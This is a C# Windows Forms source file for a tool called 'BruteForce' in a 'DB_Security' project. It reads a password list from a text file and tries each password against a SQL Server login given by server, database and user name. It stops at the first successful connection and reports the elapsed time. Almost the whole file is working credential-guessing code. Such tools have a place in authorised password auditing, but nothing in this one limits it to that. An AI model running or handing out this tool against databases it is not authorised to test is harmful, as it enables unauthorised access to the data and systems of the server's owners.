using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Data;
using System.Data.SqlClient;

namespace DB_Security
{
    public partial class BruteForce : Form
    {
        public BruteForce()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void buttonStart_Click(object sender, EventArgs e)
        {
            String password = "null";
            String connectionString;
            int count;
            count = Convert.ToInt32(numericCounter.Value);
            DateTime beforeStart = DateTime.Now;
            progressBar.Maximum = count;
            labelResult.Text = "";
            labelDuration.Text = "";
            labelResult.Update();

            for (int i = 0; i < count; i++)
            {
                int counter = i + 1;
                progressBar.Value = counter;
                labelNumber.Text = counter.ToString();
                labelNumber.Update();
                password = listBox1.Items[i].ToString();
                labelPassword.Text = password;
                labelPassword.Update();
                connectionString = "DATA SOURCE=" + textServerName.Text + ";INITIAL CATALOG=" + textDBName.Text + ";UID=" + textUserName.Text + ";PASSWORD=" + password + ";CONNECTION TIMEOUT=1";
                SqlConnection connection = new SqlConnection(connectionString);

                try
                    {
                        connection.Open();
                        if (connection.State == ConnectionState.Open)
                        {
                            labelResult.Text = "Connected!";
                            labelResult.ForeColor = System.Drawing.Color.Green;
                            DateTime afterStart = DateTime.Now;
                            TimeSpan duration = afterStart - beforeStart;
                            labelDuration.Text = "Completed in: " + duration.ToString(@"hh\:mm\:ss");
                            progressBar.Value = count;
                            return;
                        }
                    }
                catch (System.Data.SqlClient.SqlException)
                    {
                        if(counter == count)
                        {
                            labelResult.Text = "Connection Failed";
                            labelResult.ForeColor = System.Drawing.Color.Red;
                            DateTime afterStart = DateTime.Now;
                            TimeSpan duration = afterStart - beforeStart;
                            labelDuration.Text = "Completed in: " + duration.ToString(@"hh\:mm\:ss");
                    }
                    }
            }


            
        }

        private void buttonBrowse_Click(object sender, EventArgs e)
        {
            OpenFileDialog file = new OpenFileDialog();
            file.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
            file.RestoreDirectory = true;
            file.CheckFileExists = false;
            file.Title = "Select Password List";

            if (file.ShowDialog() == DialogResult.OK)
            {
                labelStatus.Text = file.SafeFileName;

                listBox1.Items.Clear();
                labelNumber.Text = "";
                labelResult.Text = "";
                labelPassword.Text = "";
                labelDuration.Text = "";
                progressBar.Value = 0;

                List<string> lines = new List<string>();
                using (System.IO.StreamReader r = new System.IO.StreamReader(file.OpenFile()))
                {
                    string line;
                    while ((line = r.ReadLine()) != null)
                    {
                        listBox1.Items.Add(line);
                        numericCounter.Maximum += 1;

                    }
                    numericCounter.Value = numericCounter.Maximum;
                }
            }

        }

        private void BruteForce_Load(object sender, EventArgs e)
        {

        }
    }
}
